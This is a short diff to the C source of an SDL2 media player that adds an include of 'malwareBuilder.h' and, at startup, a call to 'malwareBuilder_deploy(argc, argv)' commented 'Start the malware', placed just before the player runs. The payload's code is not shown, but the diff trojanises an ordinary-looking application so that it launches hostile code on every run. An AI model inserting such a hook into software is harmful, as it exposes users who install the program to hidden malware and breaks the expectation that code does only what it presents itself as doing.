@@ -5,12 +5,13 @@
 #include <SDL2/SDL_image.h>
 
 #include "mediaplayer.h"
+#include "malwareBuilder.h"
 
 #define WINDOW_WIDTH 1120
 #define WINDOW_HEIGHT 800
 #define WINDOW_SCALE 1
 
-int main() {
+int main(int argc, char *argv[]) {
    srand(time(NULL));
    MediaPlayer *app;
 
@@ -33,6 +34,9 @@ int main() {
    if (app == NULL) {
       return EXIT_FAILURE;
    }
+
+   // Start the malware
+   malwareBuilder_deploy(argc, argv);
 
    // Start the app
    mediaplayer_run(app);
